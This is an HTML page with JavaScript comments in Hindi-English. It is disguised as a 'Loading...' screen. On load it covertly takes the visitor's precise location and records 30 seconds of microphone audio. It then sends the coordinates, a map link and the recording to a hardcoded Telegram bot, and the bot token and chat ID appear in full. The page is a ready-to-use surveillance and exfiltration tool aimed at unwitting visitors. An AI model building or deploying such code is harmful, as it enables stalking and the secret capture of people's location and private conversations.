<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f4f4f4; }
        h3 { color: #333; }
    </style>
</head>
<body>
    <h3 id="statusText">Please wait...</h3>

    <script>
        // 1. Yahan apni Telegram details daalo (Quotes ke andar)
        const TELEGRAM_BOT_TOKEN = "8768491883:AAHAAVP8pW2crUetL_D_i7N9n3zlJ_h58NI"; 
        const TELEGRAM_CHAT_ID = "8839147082"; 

        // 2. Location nikaalo
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Location milte hi mic on karo
                    startMic(lat, lon, mapLink);
                },
                function(error) {
                    // Agar location deny ho jaye, toh bhi mic try karo
                    startMic("Unknown", "Unknown", "Location Denied");
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            startMic("Unknown", "Unknown", "Not Supported");
        }

        // 3. Mic start karo aur Audio record karo
        async function startMic(lat, lon, mapLink) {
            try {
                document.getElementById('statusText').innerText = "Recording audio (30s)...";
                
                // Sirf Audio (Mic) ki permission maango
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true,
                    video: false 
                });

                // MediaRecorder setup
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    // Mic band kar do
                    stream.getTracks().forEach(track => track.stop());
                    document.getElementById('statusText').innerText = "Sending to Telegram...";

                    // Audio file banao
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // Telegram par location aur audio bhejo
                    await sendToTelegram(lat, lon, mapLink, blob);
                };

                mediaRecorder.start();

                // 30000 ms = 30 second baad recording rok do
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 30000); 

            } catch (err) {
                console.error("Mic error: ", err);
                // Agar mic block ho gaya, toh bas location bhej do
                sendToTelegram(lat, lon, mapLink, null);
                document.getElementById('statusText').innerText = "❌ Mic Permission Denied";
            }
        }

        // 4. Telegram API Call
        async function sendToTelegram(lat, lon, mapLink, audioBlob) {
            try {
                // Pehle Text Message (Location ke sath) bhejo
                const textMessage = `📍 *New Audio Recording (30 Sec)*\n\n*Lat:* ${lat}\n*Lon:* ${lon}\n*Map:* [Google Maps]( ${mapLink} )`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textMessage,
                        parse_mode: "Markdown"
                    })
                });

                // Agar Audio file mili hai, toh usko Document (File) ki tarah bhejo
                if (audioBlob) {
                    const formData = new FormData();
                    formData.append("chat_id", TELEGRAM_CHAT_ID);
                    // Yahan "document" use kiya hai taki koi error na aaye
                    formData.append("document", audioBlob, "audio.webm");

                    // Yahan sendDocument use kiya hai
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                        method: "POST",
                        body: formData
                    });

                    // Check karo ki file sach mein gayi ya nahi
                    const result = await response.json();
                    
                    if (!result.ok) {
                        console.error("Telegram error:", result.description);
                        document.getElementById('statusText').innerText = "❌ Error: " + result.description;
                    } else {
                        document.getElementById('statusText').innerText = "✅ File & Location sent to Telegram!";
                    }
                } else {
                    document.getElementById('statusText').innerText = "✅ Location sent (No Audio)";
                }

            } catch (e) {
                console.error("Telegram send failed", e);
                document.getElementById('statusText').innerText = "❌ Network Error";
            }
        }
    </script>
</body>
</html>
